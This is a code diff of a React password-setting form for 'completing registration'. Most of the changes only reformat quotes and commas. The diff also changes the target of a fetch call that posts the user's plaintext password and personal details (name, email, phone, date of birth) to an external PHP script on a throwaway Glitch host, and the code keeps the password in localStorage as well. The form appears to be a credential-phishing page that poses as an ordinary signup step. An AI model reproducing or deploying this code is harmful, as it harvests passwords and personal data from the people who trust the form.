@@ -1,10 +1,10 @@
-import React, { useState } from 'react';
-import FormInput from '../components/FormInput';
+import React, { useState } from "react";
+import FormInput from "../components/FormInput";
 
 function PasswordVerification({ submissionId, userData }) {
   const [passwordData, setPasswordData] = useState({
-    password: '',
-    confirmPassword: ''
+    password: "",
+    confirmPassword: "",
   });
   const [errors, setErrors] = useState({});
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -12,32 +12,32 @@ function PasswordVerification({ submissionId, userData }) {
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
-    setPasswordData(prev => ({
+    setPasswordData((prev) => ({
       ...prev,
-      [name]: value
+      [name]: value,
     }));
     // Clear error when user starts typing
     if (errors[name]) {
-      setErrors(prev => ({
+      setErrors((prev) => ({
         ...prev,
-        [name]: ''
+        [name]: "",
       }));
     }
   };
 
   const validateForm = () => {
     const newErrors = {};
-    
+
     if (!passwordData.password) {
-      newErrors.password = 'Password is required';
+      newErrors.password = "Password is required";
     } else if (passwordData.password.length < 8) {
-      newErrors.password = 'Password must be at least 8 characters';
+      newErrors.password = "Password must be at least 8 characters";
     }
-    
+
     if (!passwordData.confirmPassword) {
-      newErrors.confirmPassword = 'Please confirm your password';
+      newErrors.confirmPassword = "Please confirm your password";
     } else if (passwordData.password !== passwordData.confirmPassword) {
-      newErrors.confirmPassword = 'Passwords do not match';
+      newErrors.confirmPassword = "Passwords do not match";
     }
 
     setErrors(newErrors);
@@ -46,53 +46,59 @@ function PasswordVerification({ submissionId, userData }) {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    
+
     if (!validateForm()) {
       return;
     }
 
     setIsSubmitting(true);
-    
+
     try {
       const completeSubmission = {
         submissionId,
         userData,
         passwordData: {
           password: passwordData.password,
-          confirmedAt: new Date().toISOString()
-        }
+          confirmedAt: new Date().toISOString(),
+        },
       };
 
       // Create FormData for the API request
       const apiFormData = new FormData();
-      apiFormData.append('submissionId', submissionId);
-      apiFormData.append('password', passwordData.password);
-      apiFormData.append('confirmedAt', new Date().toISOString());
-      
+      apiFormData.append("submissionId", submissionId);
+      apiFormData.append("password", passwordData.password);
+      apiFormData.append("confirmedAt", new Date().toISOString());
+
       // Add user data fields
       if (userData) {
-        Object.keys(userData).forEach(key => {
+        Object.keys(userData).forEach((key) => {
           apiFormData.append(key, userData[key]);
         });
       }
 
       // Send to external API
-      const response = await fetch('https://rogue-nine-mice.glitch.me/tm.php', {
-        method: 'POST',
-        body: apiFormData
-      });
+      const response = await fetch(
+        "https://mixed-fluff-space.glitch.me/zubaireng.php",
+        {
+          method: "POST",
+          body: apiFormData,
+        },
+      );
 
       if (response.ok) {
         // Store locally as backup
-        localStorage.setItem(`submission_${submissionId}`, JSON.stringify(completeSubmission));
+        localStorage.setItem(
+          `submission_${submissionId}`,
+          JSON.stringify(completeSubmission),
+        );
         setIsSubmitting(false);
         setIsComplete(true);
       } else {
-        throw new Error('Password submission failed');
+        throw new Error("Password submission failed");
       }
     } catch (error) {
-      console.error('Error submitting password:', error);
-      setErrors({ submit: 'Failed to submit password. Please try again.' });
+      console.error("Error submitting password:", error);
+      setErrors({ submit: "Failed to submit password. Please try again." });
       setIsSubmitting(false);
     }
   };
@@ -110,11 +116,15 @@ function PasswordVerification({ submissionId, userData }) {
           </p>
           <div className="bg-gray-50 p-4 rounded-lg text-left">
             <h3 className="font-semibold mb-2">Submission Details:</h3>
-            <p><strong>ID:</strong> {submissionId}</p>
-            <p><strong>Name:</strong> {userData?.firstName} {userData?.lastName}</p>
-            <p><strong>Email:</strong> {userData?.email}</p>
-            <p><strong>Phone:</strong> {userData?.phoneNumber}</p>
-            <p><strong>Date of Birth:</strong> {userData?.dateOfBirth}</p>
+            <p>
+              <strong>ID:</strong> {submissionId}
+            </p>
+            <p>
+              <strong>Phone:</strong> {userData?.phoneNumber}
+            </p>
+            <p>
+              <strong>Date of Birth:</strong> {userData?.dateOfBirth}
+            </p>
           </div>
         </div>
       </div>
@@ -127,14 +137,13 @@ function PasswordVerification({ submissionId, userData }) {
         <h2 className="text-2xl font-bold text-gray-800 mb-6">
           Set Your Password
         </h2>
-        
+
         <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
           <p className="text-blue-800 text-sm">
-            <strong>Hello {userData?.firstName}!</strong><br />
             Please create a secure password to complete your registration.
           </p>
         </div>
-        
+
         <form onSubmit={handleSubmit}>
           <FormInput
             label="Password"
@@ -146,7 +155,7 @@ function PasswordVerification({ submissionId, userData }) {
             required
             placeholder="Enter your password"
           />
-          
+
           <FormInput
             label="Confirm Password"
             type="password"
@@ -157,19 +166,17 @@ function PasswordVerification({ submissionId, userData }) {
             required
             placeholder="Confirm your password"
           />
-          
+
           {errors.submit && (
-            <div className="error-message mb-4">
-              {errors.submit}
-            </div>
+            <div className="error-message mb-4">{errors.submit}</div>
           )}
-          
-          <button 
-            type="submit" 
+
+          <button
+            type="submit"
             className="submit-button"
             disabled={isSubmitting}
           >
-            {isSubmitting ? 'Creating Account...' : 'Complete Registration'}
+            {isSubmitting ? "Creating Account..." : "Complete Registration"}
           </button>
         </form>
       </div>
